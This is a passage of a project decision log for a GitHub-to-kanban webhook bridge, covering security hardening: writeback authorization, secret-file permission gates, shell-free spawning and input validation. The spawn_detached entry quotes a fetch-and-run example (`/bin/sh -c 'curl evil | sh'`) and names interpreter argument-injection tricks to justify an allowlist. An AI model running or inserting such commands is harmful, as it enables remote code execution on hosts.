handler/config/dispatch/support.

## DL-009 — Durable-reaction class + writeback authz/injection model (designed before code; gates FR #2016)

- **Date:** 2026-05-31
- **Context:** The bridge is **typed one-way** today: `Classifier → ClassifyResult{intents, targets, reattributedActor?}`, `Handler::handle(ReactionTarget, AgentConfig): void` (`Handler.php:8-14`), and the only outbound client is `KanbanProvisionClient` (provisioning-scoped — list/create/delete webhooks). The planned FR (board 8 #2016) inverts this: a GitHub PR webhook should **move a kanban card** — the bridge's first *writeback*. A card-move is **side-effectful, not loss-tolerant, and attacker-influenced**, the opposite of the existing handler contract's treatment-C ("a handler throw is a recorded best-effort note that does NOT fail the webhook" — `DispatchService.php` docblock `:36-40`, catch at `:177-182`). Two failures result if it is bolted on as a normal handler:
  - **Reliability:** it inherits treatment-C, so a failed move silently acks 200 and never retries — violating DL-001's rule that *silently losing a durable side effect is the one unacceptable outcome* (which today only `inbox.jsonl` staging, treatment-B, is held to).
  - **Security (confused deputy):** an attacker-controllable PR title/branch would drive a *privileged kanban write* through the bridge's API token. The bridge is surface-only today; adding a writer changes its security character.
  This DL designs the **seam** — a durable-reaction contract extension + an authz/injection model — *before any code*, so two-way-ness enters as a typed contract extension rather than a treatment-C + confused-deputy violation. The FR itself flagged the open architectural fork ("a bounded module in the bridge **OR** a standalone receiver decoupled from the surface-only identity"); this DL resolves it. (This is a **design-only** entry; no code ships in its PR — it is the gate the FR builds against.)
- **Decision:**
  - **(1) Durability is a property of the Handler, not the per-emission ReactionTarget.** A new marker interface `App\Bridge\Contracts\DurableReaction` (no methods); a handler that performs a durable side effect implements it. Durability lives on the **handler** (operator-registered via `HandlerRegistry`) and *not* on the `ReactionTarget` (classifier-emitted, attacker-influenced) on purpose: a marker on the handler class cannot be set from a `ReactionTarget`, so the classify path can neither *downgrade* a card-move to best-effort (silent drop) nor *upgrade* `channel_push` to durable (`ChannelPushHandler` simply never implements the marker). Pinning durability to the registered handler makes it un-spoofable from the classify path — the whole reason it is not a target field.
  - **(2) A durable handler's throw propagates OUT of the per-agent target loop (treatment-B), and durable targets run FIRST in that loop.** The current loop wraps *every* target in one `try { … } catch { $note = (string)$e; continue; }` (`:170-182`). The new branch must, for a `$handler instanceof DurableReaction`, **`throw` out of the `foreach`** (not merely "not swallow") *before* `markDone` (`:185`) — so an uncaught durable failure becomes a `5xx` and kanban-board redelivers, exactly like treatment-B inbox staging. **Ordering is load-bearing:** the coalesced `$targets` map (`:144-168`) is partitioned so durable-marked targets run *before* best-effort ones. Reason: if a durable move throws *after* a best-effort `channel_push` already fired (incl. the `route_intents`-synthesized pushes, `:158-168`), then every redelivery re-fires those pushes until the move stops failing — a stuck durable handler would *amplify* its own agent's best-effort side effects across the retry window. Running durable first short-circuits to `5xx` before any best-effort handler runs, so redelivery re-runs the durable handler (idempotent — see 2a) and only *then*, on success, the best-effort handlers fire **once**.
  - **(2a) Durable handlers MUST be idempotent — a stated contract invariant.** Treatment-B redelivery re-runs the *whole* dispatch for that agent (classify → re-stage → re-run handlers); the `processed_at`-skip (`:98`) only protects already-*done* agents, and a durable failure leaves `processed_at` null. Re-staging is a true no-op (`IntentLog` dedups on the stable id `{delivery_id}:{agent}:{index}`), and the durable move must likewise no-op when the card is already in the target stage (the FR requires this). **`processed_at` is per-agent**, so earlier *agents* stay skipped on redelivery (no-transaction resume model, docblock `:42-47`); the idempotency requirement is intra-agent.
  - **(2b) Durable reliability presupposes a deterministic (treatment-A-clean) correlation classifier.** A durable handler sits *downstream* of `classify()`; if the correlation classifier itself throws, that is treatment-A (record error, ack **200**, no redelivery — `:110-117`), so the move never runs *and never retries* until `bridge:replay`. The move's "B-style retry" guarantee is therefore only as strong as the classifier not throwing — the correlation logic must be deterministic, not the place that does the failing network I/O.
  - **(3) A dedicated `KanbanClient` (writeback), sibling to `KanbanProvisionClient`.** Reuses the `Http::withToken` + `{"data": …}` envelope idiom (`KanbanProvisionClient.php:23,34`) but exposes only the writeback verbs (`getCard`, `moveCard`). It reads a **dedicated, least-privilege writeback token at its own distinct path** — explicitly `<secret_dir>/<provider>/writeback-token`, **not** `TokenPath::for(secret_dir, provider)` (which is the broad provisioning/API token path, DL-007 — same `(secret_dir, provider)` key would collide). Blast radius of a leaked writeback token is bounded to card moves on the mapped boards. The token is read **fail-closed at point-of-use** via the shared `SecretFile::read` 0600 reader that **B-2 (#2018, DL-010)** introduces — a hard dependency; B-2 lands first.
  - **(4) repo→board mapping is operator-config ONLY, never derived from the webhook body.** A `writeback` config block maps `repo (owner/name) → {board_id, stage_map}` where `stage_map` keys are GitHub-controlled event outcomes (`opened`, `merged`, `merged_to_main`, `closed_unmerged`) → bridge stage ids. The target board+stage come from this config keyed by the event; the payload never names its own board/stage, and the handler **ignores any `board_id` in `ReactionTarget.payload`** (the payload is classifier-/attacker-influenced) — the config mapping is authoritative.
  - **(5) The move-authorization gates on GitHub-controlled fields, not attacker-settable text.** Which *stage* to move to is decided from `pull_request.merged == true` and `pull_request.base.ref` (GitHub computes these; under a valid HMAC they are authoritative), not the PR title/branch. The PR title/branch DL-NNN parse is used ONLY for **correlation** (which card), bounded by (6).
  - **(6) `KanbanClient.moveCard` validates `card.board_id == mapped board` before moving** (fetch-then-check in the client/handler — un-bypassable from a custom classifier; note the cost: two upstream round-trips on the synchronous request path, an accepted TOCTOU/latency trade for the authz check). Worst case under a correlation-only attack (a PR author titling their PR `DL-008` to nudge that card): the attacker moves a card *that legitimately lives on the operator-mapped board* to *any stage in that repo's config-mapped `stage_map`* (their choice within the mapped set) — a contained, reversible, structure-logged stage change, never an arbitrary-card or cross-board write.
  - **(7) Echo-suppress the writeback identity via a GLOBAL echo seam (new — `isEcho()` is per-agent today).** The move executes as a specific kanban user (the writeback token's user); kanban-board then emits a `card_updated`/`task.moved` webhook with that **kanban `user_id`** as actor, which loops back into the bridge. `isEcho()` (`DispatchService.php:189-206`) is *strictly per-agent* — it reads only `$agent->echoSuppression->treatAsEchoIds` (the per-agent auto-seeded self-ids); there is **no global echo lever** in the code. So decision 7 requires a real new seam: a config value `writeback.<provider>.identity_id` whose id is **unioned into every agent's effective echo set** inside `isEcho()` (the bridge's own machine writes are never a signal for *any* agent). It keys on the **kanban actor axis** (`AgentRegistry::actorFromEvent` kanban branch) and is *unaffected* by the github-only `isSharedGithubId` filter (`:196-199`), so no shared-identity (DL-002/005) interaction breaks it. Without this seam a lone config key has nothing reading it and the writeback feedback-loops.
  - **(8) Correlation stays in classifier/agent business logic; the bridge provides the *primitive*, not a workflow engine.** "Which card is this PR?" (title/branch/`pr_number` parse) lives in a classifier (or the agent), which emits a `ReactionTarget{handler: 'kanban_move_card', …}`. The bridge supplies: the durable-reaction contract, the `KanbanClient`, the config-mapping + belongs-to-board guardrail, the dedicated token, and the global echo-suppression. It does not parse PR titles or own the workflow — keeping its "surface + primitive" character intact.
  - **Architectural fork resolved: a bounded module *inside* the bridge, not a standalone receiver.** It reuses the already-built, already-tested receiver HMAC, adapter/envelope parsing, dispatch ledger (`agent_dispatches`), and `bridge:replay` recovery — a standalone receiver re-implements all of it. The review's "decouple from the surface-only identity" concern is satisfied *within* the bridge by keeping the writeback **identity** (7) and **token** (3) strictly separate and least-privilege — the surface-only reading path never gains write capability; only the new durable handler, holding its own credential, does. The durable-reaction contract is also general (any future durable side effect), earning its place beyond this one FR.
- **Alternatives considered:**
  - **Durability as a `ReactionTarget` field (`durability: best_effort|durable`).** Rejected: the target is classifier-emitted and therefore attacker-influenced; a field there lets the classify path spoof a side effect's durability (downgrade a move to silent-drop, or weaponize `channel_push` into a 5xx storm). The handler is the operator-controlled, un-spoofable place for an intrinsic property of *what the side effect is*.
  - **Bolt the move on as a normal (treatment-C) handler.** Rejected — it is the whole anti-pattern this DL exists to prevent: silent drop of a durable write (reliability) + confused-deputy privileged write (security).
  - **Standalone tiny receiver, decoupled from the bridge process.** Rejected: re-implements HMAC verification, envelope adapters, the dedup/replay store, and config/secret machinery the bridge already has, tested. Decoupling the *identity/token* (the actual security concern) is achievable inside the one process; decoupling the *process* buys isolation we don't need at single-operator scale and doubles the maintenance surface. Re-evaluate only if a second, unrelated writeback consumer appears.
  - **Reuse the existing broad API/provisioning token for the move.** Rejected: violates least-privilege — that token can create/delete webhook subscriptions; a card-mover should hold only card-move scope. Separate path, separate kanban user.
  - **Derive the target board/stage from the webhook body (a label or PR field).** Rejected: that hands an attacker the destination — the confused-deputy hole. Operator config is the only trusted source for "where can this repo write."
  - **Wrap the durable move + inbox staging in a DB transaction for all-or-nothing.** Rejected for the same reason DL-001 rejected transaction-wrapping the loop: a rollback can't un-send an HTTP move, and there is no all-or-nothing semantic to protect — idempotency + redelivery is the recovery, not rollback.
- **Consequences:**
  - **New contract surface (additive, zero-touch for existing handlers):** `App\Bridge\Contracts\DurableReaction` marker; `DispatchService`'s handler loop partitions `$targets` into durable-first then best-effort, branching on `$handler instanceof DurableReaction` (durable → `throw` out of the loop; else → today's note). The four shipped handlers (`log_intent`, `channel_push`, `registry_append`, `spawn_detached`) implement nothing → remain treatment-C, behavior unchanged.
  - **New global-echo seam in `isEcho()`** (the first non-per-agent echo input) — small but load-bearing; tested for "writeback identity's `card_updated` is suppressed for every subscribed agent."
  - **Components the FR (#2016) builds on this seam:** `App\Bridge\Provision\KanbanClient` (`getCard`/`moveCard`); a `KanbanMoveCardHandler implements Handler, DurableReaction`; a `writeback` config block in `config/bridge.php` (`identity_id`, `token_path` default `<secret_dir>/<provider>/writeback-token`, `mappings[]`); a correlation classifier wiring board 5 + board 8.
  - **Dependency / sequencing:** lands **after** B-2 (#2018, DL-010) so the writeback token reuses the unified 0600 reader. This DL is **design-only — no code in its PR**; it unblocks FR #2016, which is the implementation and carries its own security-surface review (standing rule 5/9).
  - **Residual accepted risk:** a PR author can nudge a *legitimately-mapped* card to *any stage in that repo's mapped `stage_map`* via title correlation — bounded, reversible, logged. Documented, not mitigated further (full mitigation needs author-identity trust the GitHub webhook doesn't carry).
  - Anticipated files when FR #2016 implements: `app/Bridge/Contracts/DurableReaction.php`, `app/Bridge/Dispatch/DispatchService.php` (loop partition + `isEcho` global union), `app/Bridge/Provision/KanbanClient.php`, `app/Bridge/Handlers/KanbanMoveCardHandler.php`, `config/bridge.php` (`writeback` block), a correlation classifier, `app/Bridge/Support/SecretFile.php` (from B-2), docs (`CLAUDE_ARCHITECTURE.md` two-way section, `docs/customization.md` durable-handler note), tests across dispatch/handler/client/config.

## DL-010 — Unify the 0600 secret-perms gate at point-of-use across every secret reader (B-2)

- **Date:** 2026-05-31
- **Context:** DL-008 made a group/world-readable *channel* token a fail-closed error (`ChannelToken::read`, SSH-style `mode & 0o077`), reasoning that on a multi-tenant host a secret a co-tenant can *read* is no boundary. The 2026-05-31 architecture review (B-2) found that reasoning was never applied to the two **higher-value** secrets: the per-`(provider, scope)` **HMAC secret** (`VerifyHmacSignature::loadSecret`, bare `@file_get_contents`) and the **kanban API token** (`TokenFile::readTrimmed`, used with `Http::withToken`). A co-tenant who reads the HMAC secret forges perfectly-valid signed webhooks (→ `channel_push` into a live session, → `spawn_detached`); reading the API token gives direct upstream write access. The provisioner *writes* `0600` (`WebhookProvisioner`), but nothing *enforced* it on read — a `cp`/`umask` accident that leaves a secret `0644` silently widened the trust boundary.
- **Decision:** One shared perms primitive, `App\Bridge\Support\SecretFile`, consulted by every secret reader; each maps the failure to its own surface (fail-closed).
  - **`SecretFile::isInsecure(path)`** is the single home of the `mode & 0o077` gate. A **missing** file is NOT insecure (returns false) — the caller decides what an absent secret means (`unknown_scope` / skip / throw), so the gate never converts "absent" into "insecure".
  - **`SecretFile::read(path)`** is the perms-enforced trimmed read for the token case: null when absent/blank, throws `InsecureSecretPermsException` when present-but-group/world-readable. Trimming stays in `TokenFile::readTrimmed` (the single trim primitive, DL-008).
  - **Every reader, each mapped to its own surface:** the HMAC receiver checks `isInsecure` *before* the read and returns **500 `secret_perms_insecure`** (a missing secret still 401s `unknown_scope` — the check is ordered so it only fires on a present file); `bridge:provision` reads the API token via `SecretFile::read`, so an insecure token is a **command failure** (`FAIL`, non-zero exit), not the silent `SKIP` an *absent* token gets — a readable token any co-tenant can use to write upstream must not provision quietly; `ChannelToken::read` keeps its own `ChannelTokenException` + message (the DL-008 contract) but delegates the `mode & 0o077` logic to `SecretFile::isInsecure` so the rule lives in one place; and `WebhookProvisioner` (the fourth reader — `--reconcile` re-reads the HMAC secret to reuse it on the recreated subscription) refuses with `cannot_reconcile` rather than re-pushing a co-tenant-readable secret upstream (the receiver would 500 the recreated subscription anyway).
  - **The gate reads LIVE perms** — `isInsecure` calls `clearstatcache(true, $path)` before `fileperms`. PHP's per-process stat cache persists across FPM requests, so a fail-closed security check that trusted a cached mode could keep accepting a since-loosened secret (or rejecting a since-fixed one). A security gate must reflect the file's current state.
  - **`bridge:check`** extends its preflight perms warning to all three: the HMAC secret and API token now warn (matching the existing channel-token warn) when group/world-readable, naming the exact runtime consequence (receiver 500 / provision FAIL).
- **Alternatives considered:**
  - **Leave the HMAC secret / API token unchecked (status quo).** Rejected: the review's whole point — the two highest-value secrets were held to a weaker bar than the channel token, with a larger blast radius (forge-any-webhook / write-upstream).
  - **Enforce perms only in `bridge:check` (warn-at-preflight, no runtime gate).** Rejected: preflight is advisory and runs when the operator remembers to; the boundary must be enforced *at point-of-use*, fail-closed, the same posture DL-008 already took for the channel token. Warn + enforce, not warn-only.
  - **Make the HMAC perms failure a 401 (like `unknown_scope`).** Rejected: an insecure secret is an *operator misconfiguration to fix*, not an authentication outcome — 500 makes kanban-board hold + redeliver (the event isn't lost) and is distinguishable in logs (`secret_perms_insecure`), whereas 401 would silently drop a legitimate delivery.
  - **A single `SecretFile::read` for all three (collapse the HMAC reader onto it).** Rejected: the HMAC path needs the absent→401 vs empty→500 distinction that `read()`'s null-collapse erases; `isInsecure` (predicate) + the existing read keeps those contract-significant status codes intact.
- **Consequences:** New `app/Bridge/Support/SecretFile.php` + `app/Bridge/Exceptions/InsecureSecretPermsException.php`. **Behavior change (fail-closed tightening):** a `0644` HMAC secret now 500s the receiver (was: trusted); a `0644` API token now fails `bridge:provision` (was: provisioned). Safe direction — the provisioner already writes `0600`, so a correctly-provisioned install is unaffected; an operator who hand-placed a loose secret gets a clear `bridge:check` warning and a fail-closed runtime, with kanban-board holding the held events until they `chmod 600`. Files: `app/Bridge/Support/SecretFile.php`, `app/Bridge/Exceptions/InsecureSecretPermsException.php`, `app/Http/Middleware/VerifyHmacSignature.php`, `app/Bridge/Support/ChannelToken.php`, `app/Bridge/Provision/WebhookProvisioner.php` (reconcile reader), `app/Console/Commands/Bridge/{Provision,Check}Command.php`, `CLAUDE_GOTCHAS.md`, tests across receiver/provision/support. Unblocks DL-009's dedicated writeback token, which reads via this same gate.

## DL-011 — `spawn_detached` is opt-in, executable-allowlisted, and shell-free (B-3)

- **Date:** 2026-05-31
- **Context:** `HandlerRegistry` registered `spawn_detached` unconditionally, and the handler ran `exec('setsid <cmd> … &')` — a shell string. Its safety rested on "`cmd` is operator-authored (classifier code), not attacker webhook data." The 2026-05-31 architecture review (B-3) flagged that as a **convention, not an invariant**: `docs/customization.md` actively invites custom classifiers, and the natural `ReactionTarget::make(handler: 'spawn_detached', payload: $payload)` passthrough would hand an attacker the argv. `escapeshellarg` stopped a metacharacter breakout *within the shell* but never constrained **which program runs** (`cmd: ["/bin/sh", "-c", "curl evil | sh"]` is a perfectly-escaped argv). This is the highest-blast-radius surface in the bridge (RCE as the install user on a shared host); over a long-enough horizon, P(some operator wires a passthrough classifier) → 1.
- **Decision:** Three defense layers, each independent.
  - **Opt-in registration.** `HandlerRegistry` ships three always-on handlers (`log_intent`, `registry_append`, `channel_push`); `spawn_detached` is registered **only** when `config('bridge.spawn.enabled')` (`BRIDGE_SPAWN_ENABLED`, default false), wired via a `BridgeServiceProvider` singleton closure. On an install that hasn't enabled it, a `spawn_detached` target resolves to null → the dispatcher records a best-effort note (treatment C), never an execution.
  - **Executable allowlist.** Even when enabled, the program — `cmd[0]` — must be exactly one of `config('bridge.spawn.allowlist')` (`BRIDGE_SPAWN_ALLOWLIST`, comma-separated **absolute** paths). Not in the list ⇒ `HandlerException` (recorded note, no run). An empty allowlist with `enabled=true` runs nothing — fail-closed. The program is trusted by the allowlist, never by the source of the argv. **Caveat (documented prominently):** the allowlist gates `cmd[0]` only — the classifier still supplies `cmd[1..]` — so an operator must allowlist a **fixed-purpose wrapper script**, never an interpreter or flag-flexible tool (`php`, `bash`, `env`, `git`, `find`, `ssh`, …); allowlisting `php` or `git` lets attacker-influenced arguments (`php -r …`, `git -c core.sshCommand=…`) run arbitrary code, reopening the very RCE this guards. Generically gating every argument is infeasible, so this is enforced by guidance (`.env.example`, `config/bridge.php`, `docs/customization.md` all carry the warning), not code.
  - **Shell-free execution.** `exec(<shell string>)` is replaced by `proc_open` with an **argv array** — execs the program directly, no `/bin/sh -c`, so there is no shell-metacharacter surface at all (the old `escapeshellarg` was only ever patching a shell we now don't invoke). Detachment is `setsid -f` (util-linux: new session + fork-to-background), so the child outlives the FPM request and `proc_open`'s immediate child returns at once. `cwd` and `env` are `proc_open` parameters (env merged over the inherited environment), not a `cd … && env …` shell prefix; stdout/stderr redirect to the log via the descriptor spec.
- **Alternatives considered:**
  - **Keep it always-registered, rely on the allowlist alone.** Rejected: defense-in-depth — an install that never uses `spawn_detached` should not carry a registered RCE primitive at all. Opt-in means the capability is absent unless deliberately turned on; the allowlist then bounds it when it is.
  - **Keep the shell but harden escaping further.** Rejected: `escapeshellarg` cannot constrain *which binary* runs, only quote its args — the actual hole. Removing the shell removes the entire class.
  - **`posix_setsid` after `pcntl_fork` in-process** (the review's literal phrasing). Rejected as the mechanism: `pcntl` is commonly disabled in FPM, and forking the FPM worker to call `posix_setsid` is fragile. `setsid -f` via `proc_open` achieves the identical new-session detachment with no PHP extension dependency and no shell — the same intent, a more portable mechanism.
  - **Allow relative program names resolved via `PATH`.** Rejected: a relative name is ambiguous and PATH-dependent (a planted binary earlier in PATH wins). Absolute-path allowlist entries are unambiguous and what the operator actually authorized.
- **Consequences:** New config block `config/bridge.php` `spawn` (`enabled` + `allowlist`); `BRIDGE_SPAWN_ENABLED` / `BRIDGE_SPAWN_ALLOWLIST` in `.env.example`. `HandlerRegistry::__construct(bool $spawnDetachedEnabled = false)` — the default-off bool keeps direct `new HandlerRegistry` (tests, custom wiring) safe; `BridgeServiceProvider` passes the config flag. **Behavior change:** existing installs that relied on `spawn_detached` being available must now set `BRIDGE_SPAWN_ENABLED=true` **and** allowlist their program's absolute path — a deliberate, documented break (the reference installs do not use `spawn_detached`). `docs/customization.md` updated (handler table + the `spawn_detached` section + the synchronous-handler note). Files: `app/Bridge/Handlers/SpawnDetachedHandler.php`, `app/Bridge/Support/HandlerRegistry.php`, `app/Providers/BridgeServiceProvider.php`, `config/bridge.php`, `.env.example`, `docs/customization.md`, tests `SpawnDetachedHandlerTest` + `HandlerRegistryTest`.

## DL-012 — Retention (`bridge:prune`) + remove the O(file) hot-path inbox dedup (B-4)

- **Date:** 2026-05-31
- **Context:** The append-only stores had no retention and a dedup that degraded on **calendar time, not load** (2026-05-31 architecture review B-4). `IntentLog::stage()` called `BridgePaths::jsonlContainsId()` **per intent** — `file($path)` + linear scan, and the common case (id absent) read the *whole file every time* — on the **synchronous webhook hot path**, so inbox bloat directly inflated the request latency the DL-001 at-least-once bet depends on. Nothing pruned `inbox*.jsonl`, the seen-cursors, `webhook_events` (its `received_at` index was even commented "retention pruning" — but no prune existed), or `agent_dispatches`. A stored GitHub payload is 50–100 KB of diff kept forever. Quadratic in file lifetime.
- **Decision:**
  - **`bridge:prune` (the one cron the synchronous design accepts — it never runs on the hot path).** `--older-than=Nd` deletes `webhook_events` received before the cutoff (`agent_dispatches` go via `cascadeOnDelete`) and trims `inbox*.jsonl` lines older than it; `--null-payloads-older-than=Md` nulls `webhook_events.payload` past the replay window while keeping the row (its `delivery_id` dedup gate + audit metadata) — `payload` is made nullable by a migration; `--dry-run` reports counts and changes nothing.
  - **Remove the per-intent JSONL dedup from the hot path.** `IntentLog::stage()` now appends O(1) with no read-before-write. Idempotency is preserved by the gates that already exist: **full** redelivery is skipped upstream by the `agent_dispatches.processed_at` check (`DispatchService.php:98`), so `stage()` is never re-called for a completed dispatch; a **partial-staging** redelivery (a treatment-B IO failure mid-loop leaves `processed_at` null, re-writing already-written ids) is deduped on the **read side** — `bridge:inbox` collapses duplicate `id`s among unseen lines, so a re-staged line surfaces at most once. `jsonlContainsId` is deleted (no remaining caller — no dead code).
  - **Bound the seen-cursor by pruning it, keeping exact-id dedup** (a deliberate departure from the review's "high-water `ts` cursor" — see alternatives). `bridge:prune` trims each inbox file and then intersects its paired seen-cursor (`inbox-seen[-<agent>].json`) down to the ids that still exist, so the seen set is bounded by the trimmed inbox rather than by all activity ever.
- **Alternatives considered:**
  - **A high-water `ts` cursor instead of the id set (the review's suggested mechanism).** Rejected in favour of keeping the **exact-id** seen set (bounded by prune): a single `ts` water-mark is an *approximation* that assumes `received_at` is strictly monotonic across every staged line and would silently skip a line that ever landed below the mark (clock skew, an out-of-order stage, a backfill). Exact-id dedup has no such failure mode; the only cost the review cited — unbounded growth — is removed by pruning the set instead. Same goal (bounded cursor), stronger correctness. (`ts` is still carried per line, for ordering + so prune can age inbox lines deterministically.)
  - **Keep the write-side dedup but cache/index it.** Rejected: any read-before-write on the synchronous path reintroduces the calendar-time cost; the authoritative gate (`processed_at`) + read-side collapse already cover every case, so the write scan is pure overhead.
  - **Delete old `webhook_events` rows wholesale (no payload-null tier).** Rejected: the row is the `delivery_id` dedup gate and the replay/audit record; nulling the big payload past the replay window keeps those cheaply while shedding the bulk. Two tiers (`--null-payloads-older-than` < `--older-than`) let an operator keep lean metadata far longer than full bodies.
  - **A `DB::transaction` or fancier scheduler.** Out of scope — `bridge:prune` is an idempotent, operator-run (or cron'd) maintenance command; re-running it is safe.
- **Consequences:** New `app/Console/Commands/Bridge/PruneCommand.php`; migration `…_make_webhook_events_payload_nullable.php`. `IntentLog` is append-only on the hot path; `BridgePaths::jsonlContainsId` removed; `InboxCommand` collapses duplicate unseen ids. **Operational:** schedule `bridge:prune --older-than=<retention>d [--null-payloads-older-than=<window>d]` (e.g. via cron) per install — it is the only periodic job in the otherwise daemonless design; nothing breaks if it is never run except unbounded growth. Behavior: a partial-staging redelivery can now leave a duplicate inbox *line* (collapsed on read) where before the write was deduped — the surfaced result is unchanged. Files: `app/Console/Commands/Bridge/PruneCommand.php`, `app/Bridge/Dispatch/IntentLog.php`, `app/Bridge/Support/BridgePaths.php`, `app/Console/Commands/Bridge/InboxCommand.php`, `database/migrations/2026_05_31_000001_make_webhook_events_payload_nullable.php`, `CLAUDE.md` (command list), `CLAUDE_DEPLOYMENT.md` (retention op), tests in `BridgeCommandsTest` + `IntentLogTest`.

## DL-014 — Security tail of the architecture review: regex `D`-anchor, classifier-socket prefix gate, config-dir perms warning (B-13 + B-14 + B-17)

- **Date:** 2026-05-31
- **Context:** Three lower-severity security findings from the architecture review, bundled because each is a small, fail-closed tightening:
  - **B-13 (regex anchor):** `ProviderName` (`^[a-z0-9_]+$`) and `ScopeId` matched with `preg_match` but **without the `D` modifier**, so `$` also matches *before* a trailing `\n` — `"github\n…"` / `"5\n…"` could slip a second line past the anchor. Low exploitability (provider comes from the route, scope is re-checked vs the body), but `ScopeId` is also the path-traversal boundary for the per-scope secret filename.
  - **B-14 (classifier-supplied socket):** `channel_push`'s `url` transport is loopback-SSRF-gated, but a **classifier-supplied `socket`** (payload, attacker-influenceable — same trust class as `spawn_detached`'s argv, DL-011) had no path constraint. A custom passthrough classifier could point the push at another tenant's UDS. (No shipped classifier supplies a payload socket — `EventDrivenClassifier` leaves the transport to the agent's config — so this is a guard against custom classifiers, not a live bug.)
  - **B-17 (config-dir perms):** the config dir holds the HMAC secrets + tokens but nothing warned if it was left group/world-traversable on a multi-tenant host.
- **Decision:**
  - **B-13:** add the `D` (PCRE_DOLLAR_ENDONLY) modifier to both validators' `matches()`. The `PATTERN` constants are unchanged (so the published-pattern tests stand); only the match call tightens.
  - **B-14:** a classifier-supplied socket (the `! $usedAgentChannel` branch in `ChannelPushHandler`) must sit under a configured absolute prefix `bridge.channel.allowed_socket_dir` (`BRIDGE_CHANNEL_ALLOWED_SOCKET_DIR`); when that is unset, a classifier-supplied socket is **refused outright** (fail-closed, mirroring DL-011's opt-in posture). The path is first run through `SocketPath::isValid` (rejects `..`), so the `str_starts_with` prefix compare can't be escaped via `/allowed/../other.sock`. The **agent's own `channel.socket`** (operator-authored YAML) is exempt — the gate only constrains the attacker-influenceable payload path.
  - **B-17:** `bridge:check` **warns** (not fails) when a secret-holding dir is group/world-accessible (`mode & 0o077 != 0`) — the config dir, **and** `secret_dir` when split to a different path (a shared `warnIfDirInsecure` helper covers both). Warn, not fail, because perms are operator-owned and the per-secret `0600` gate (DL-010) is the hard backstop — this is the preflight nudge.
- **Alternatives considered:**
  - **B-13 via `\z` in the PATTERN constant instead of the `D` modifier.** Rejected: changing the constant would ripple into the "pattern matches the provisioner" tests and the path-traversal doc; the `D` flag is the localized, behavior-only fix.
  - **B-14: allow any classifier socket, rely on the existing `..`/symlink/filetype checks.** Rejected: those stop traversal and TOCTOU but not *which directory* — an absolute `/run/user/<other>/x.sock` passes them all. The prefix gate is the missing "whose socket" constraint, and fail-closed-when-unset matches how DL-011 treats the analogous `spawn_detached` surface.
  - **B-14: a global on/off flag instead of a dir prefix.** Rejected: the prefix both enables the capability and bounds it in one value, the same shape as `spawn_allowlist`.
  - **B-17: fail (not warn) on a non-0700 config dir.** Rejected: it would brick existing installs whose dir is `0750`/`0755` but whose individual secrets are `0600` (already enforced, DL-010); the directory perm is defense-in-depth, so a warning is proportionate.
- **Consequences:** New config `bridge.channel.allowed_socket_dir` (`BRIDGE_CHANNEL_ALLOWED_SOCKET_DIR`, default null). **Behavior change:** a classifier that hand-emits a `channel_push` with its own `socket` now requires that env to be set (and the socket under it) — the no-classifier `route_intents` path and agent-config sockets are unaffected. `ProviderName`/`ScopeId` reject trailing-newline inputs. `bridge:check` gains a config-dir perms warning. Files: `app/Bridge/Validation/{ProviderName,ScopeId}.php`, `app/Bridge/Handlers/ChannelPushHandler.php`, `config/bridge.php`, `app/Console/Commands/Bridge/CheckCommand.php`, `.env.example`, tests across validators/handler/console.

## DL-018 — Implement the durable-reaction seam: `DurableReaction` + durable-first dispatch + global echo (FR #2016, phase 1)

- **Date:** 2026-05-31
- **Context:** DL-009 *designed* the seam for the planned GitHub-PR→card-move writeback (board 8 #2016) but shipped no code. This is **phase 1 of the implementation**: the contract + dispatch-loop change + echo seam the writeback handler will plug into — built and tested **without** the writeback itself, so the foundational behavior change lands and is verified in isolation (the `KanbanClient` / `KanbanMoveCardHandler` / correlation classifier are phases 2–4).
- **Decision:**
  - **`App\Bridge\Contracts\DurableReaction`** — an empty marker interface. A handler implementing both `Handler` and `DurableReaction` is durable; durability is a property of the operator-registered handler, never of the classifier-emitted `ReactionTarget` (un-spoofable from the classify path), exactly as DL-009 specified.
  - **`DispatchService` partitions the per-agent target loop by durability.** Durable handlers run **first**; an uncaught durable throw **propagates** (treatment B → 5xx → redelivery) instead of being swallowed as a best-effort note. Best-effort handlers (today's behavior) run after, in the existing try/catch-as-note. Durable-first means a durable failure short-circuits before any best-effort handler fires, so redelivery re-runs the whole dispatch (durable handlers MUST be idempotent) without re-amplifying best-effort pushes. The four shipped handlers implement nothing → unchanged.
  - **Global echo seam in `isEcho()` via `config('bridge.global_echo_ids')`** (a list; `BRIDGE_GLOBAL_ECHO_IDS`, comma-separated) — provider actor ids whose events are never a signal for **any** agent (the bridge's own machine-write identities), unioned on top of the per-agent self ids. `isEcho()` was strictly per-agent; this is its one non-per-agent input. **Refinement of DL-009:** DL-009 named `writeback.<provider>.identity_id`; the implementation uses a more general `global_echo_ids` **list** so any machine identity (not just one writeback) can be globally suppressed — the writeback identity will be added to this list when phase 2/4 wires the `writeback` config block.
- **Alternatives considered:**
  - **Durable as a `ReactionTarget` field.** Rejected (DL-009): classifier-emitted = attacker-influenceable; the marker on the operator-registered handler is un-spoofable.
  - **Run durable handlers last (after best-effort).** Rejected: a late durable failure would re-fire the already-run best-effort handlers on every redelivery — durable-first short-circuits that.
  - **A single `writeback.identity_id` scalar (DL-009's literal wording).** Generalized to a list now so the seam isn't writeback-specific; the scalar would have needed widening the first time a second machine identity appeared.
- **Consequences:** New `app/Bridge/Contracts/DurableReaction.php`; `DispatchService` loop partition + `isEcho` global union (`global_echo_ids` helper); `config/bridge.php` `global_echo_ids`; `BRIDGE_GLOBAL_ECHO_IDS` in `.env.example`; `docs/customization.md` durable-handler note. No behavior change for existing installs (nothing implements `DurableReaction`; `global_echo_ids` defaults empty). ## DL-020 — `KanbanMoveCardHandler`: the durable card-move writeback + transient-vs-permanent failure split (FR #2016, phase 3)

- **Date:** 2026-05-31
- **Context:** Phase 3 of FR #2016: the handler that actually moves a kanban card, plugging the phase-1 `DurableReaction` seam into the phase-2 `KanbanClient`/`WritebackConfig`. DL-009 set the authz model (operator-config board+stage, belongs-to-mapped-board guard, GitHub-controlled-outcome gating); this DL pins down the **failure treatment**, the one genuinely new decision — a durable handler throws → 5xx → *retry*, which is right for a transient failure but catastrophic (a retry-storm) for a permanent one.
- **Decision:** `App\Bridge\Handlers\KanbanMoveCardHandler implements Handler, DurableReaction`. The classifier (phase 4) supplies the payload `{card_id, repo, outcome}`; the handler:
